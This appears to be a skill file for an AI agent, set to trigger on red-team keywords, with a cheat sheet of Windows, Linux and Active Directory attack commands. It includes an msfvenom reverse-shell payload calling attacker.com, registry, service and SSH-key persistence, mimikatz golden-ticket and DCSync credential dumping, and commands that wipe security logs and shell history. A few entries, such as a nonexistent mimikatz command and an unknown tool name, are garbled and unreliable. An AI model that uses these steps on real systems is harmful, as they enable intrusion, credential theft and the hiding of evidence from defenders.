name: red-team
description: Red teaming — C2, persistence, lateral movement, privilege escalation, domain penetration, Active Directory attacks
trigger:
  - red team
  - red teaming
  - C2
  - lateral movement
  - privilege escalation
  - AD attack
  - domain penetration
  - persistence

---

# RED TEAMING OPERATIONS

## C2 (Command & Control)

### Common C2 Frameworks
- Covenant
- Cobalt Strike
- Metasploit
- Empire
- Koadic
- Mythic
- Sliver

### C2 Profiles
```bash
# HTTP profile
# DNS profile
# SMB profile
# TCP profile
# Acrylic DNS
```

---

# INITIAL ACCESS

## Phishing
```bash
# Clone login page
setoolkit

# Create malicious Office doc
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker.com -o doc.doc
```

## Social Engineering
- Clone sites
- credential harvesting
- Link manipulation

## Drive-by Downloads
- Watering hole
- Malvertising
- Exploit kits

---

# PRIVILEGE ESCALATION

## Windows Privilege Escalation
```bash
# Check privileges
whoami /all
whoami /priv

# Find writable services
icacls C:\ProgramData
dir /a C:\Program Files*

# Always Install Elevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer

# DLL hijacking
# Find DLLs in PATH
# Replace with malicious DLL

# Unquoted service paths
wmic service get name,displayname,pathname,startmode
sc qc service_name
```

### Kernel Exploits
```bash
# Try common exploits
# MS16-014, MS16-016, MS16-032
# Check exploit-db for Windows
```

## Linux Privilege Escalation
```bash
# SUID binaries
find / -perm -4000 2>/dev/null

# Sudo privileges
sudo -l

# Cron jobs
ls -la /etc/cron.d/
cat /etc/crontab

# Capabilities
getcap -r / 2>/dev/null

# Wildcard exploits
tar, rsync, etc.
```

---

# LATERAL MOVEMENT

## Windows Lateral Movement
```bash
# PsExec
psexec.py domain/user@target
smbexec.py domain/user@target

# WMI
wmiexec.py domain/user@target

# PowerShell Remoting
Enter-PSSession -ComputerName target -Credential $cred

# RDP
xfreerdp /u:user /p:pass /v:target

# SMB
smbclient //target/share -U user

# WinRM
winrs -r:target whoami
```

## Linux Lateral Movement
```bash
# SSH
ssh user@target

# RADIUS exploitation
radclient

# SNMP
snmpwalk -v2c -c public target

# LDAP
ldapsearch
```

---

# PERSISTENCE

## Windows Persistence
```bash
# Registry Run keys
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Malware" /d "malicious.exe"
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "Malware" /d "malicious.exe"

# Scheduled tasks
schtasks /create /tn "Task" /tr "malicious.exe" /sc daily

# Services
sc create "Malware" binpath= "malicious.exe"

# WMI Event Subscription
# PowerShell profile
# COM hijacking

# DLL Search Order Hijacking
# Replace DLL in PATH
```

## Linux Persistence
```bash
# Cron
* * * * * /tmp/malicious.sh

# SSH keys
echo "ssh-rsa AAAAB..." >> ~/.ssh/authorized_keys

# PAM
# Modify /etc/pam.d/

# Startup
/etc/rc.local
```

---

# ACTIVE DIRECTORY ATTACKS

## AD Enumeration
```bash
# BloodHound
# PowerView
# SharpView

# Find domain users
Get-ADUser -Filter *

# Find domain computers
Get-ADComputer -Filter *

# Find domain groups
Get-ADGroup -Filter *

# Find OUs
Get-ADOrganizationalUnit -Filter *
```

## AD Attack Techniques

### Kerberoasting
```bash
# Request TGS
GetUserSPNs.py domain/user@domain

# Crack hash
hashcat -m 13100 hash.txt wordlist.txt
```

### AS-REP Roasting
```bash
# Get AS-REP hash
Get-ASREPHash.ps1

# Crack
hashcat -m 18200 hash.txt wordlist.txt
```

### Pass-the-Hash
```bash
# Impacket
psexec.py -hashes :hash user@target
wmiexec.py -hashes :hash user@target
```

### Pass-the-Ticket
```bash
# Extract ticket
mimikatz sekurLsa::extract

# Use ticket
mimikatz sekurLsa::ptt
```

### Golden Ticket
```bash
# Get krbtgt hash
mimikatz lsadump::dcsync

# Create golden ticket
mimikatz kerberos::golden /user:Administrator /domain:domain.com /krbtgt:hash

# Inject ticket
mimikatz kerberos::ptt
```

### DCSync
```bash
# Dump all hashes
mimikatz lsadump::dcsync /user:Administrator

# Use secretsdump
secretsdump.py domain/user@target
```

### Privilege Escalation in AD
- **Kerberoasting** - Request TGS, crack
- **AS-REP Roasting** - No preauth account
- **Silver Ticket** - Fake TGS
- **Golden Ticket** - Fake TGT
- **Skeleton Key** - Backdoor login
- **DCSync** - Dump all hashes

---

# DATA EXFILTRATION

## Techniques
- DNS TXT records
- ICMP tunneling
- Steganography
- Cloud storage
- Encoding (base64, gzip)

## Tools
- Exfiltration over DNS
- C2 over DNS
- Cloud-based exfil

---

# CLEANING TRACKS

## Windows
```bash
# Clear logs
wevtutil cl "Security"
wevtutil cl "System"
wevtutil cl "Application"

# Clear prefetch
del C:\Windows\Prefetch\*.*

# Clear recent
del %APPDATA%\Microsoft\Windows\Recent\

# Modify timestamps
```

## Linux
```bash
# Clear logs
>/var/log/auth.log
>/var/log/syslog

# Clear bash history
export HISTSIZE=0
history -c
```

---

# RED TEAM TOOLS

| Tool | Purpose |
|------|---------|
| Covenant | C2 framework |
| Cobalt Strike | C2, red team |
| Metasploit | Exploitation |
| Empire | Post-exploitation |
| BloodHound | AD enumeration |
| SharpHound | AD enumeration |
| PowerView | AD enumeration |
| mimikatz | Cred extraction |
| Rubeus | Kerberos attacks |
| CrackMapExec | Cred spraying |
| smbexec | Lateral movement |
| wmiexec | Lateral movement |
| secretsdump | AD cred dumping |
| keimark | Kerberoasting |

---

# RED TEAMING CHECKLIST

## Initial Access
- [ ] Phishing
- [ ] Watering hole
- [ ] Stolen credentials

## Privilege Escalation
- [ ] Check privileges
- [ ] Find escalation path
- [ ] Exploit

## Lateral Movement
- [ ] Move to other systems
- [ ] Use credentials

## Persistence
- [ ] Add backdoor
- [ ] Maintain access

## Domain Penetration
- [ ] Enumerate AD
- [ ] Escalate to DA
- [ ] Dump credentials

## Data Collection
- [ ] Find sensitive data
- [ ] Exfiltrate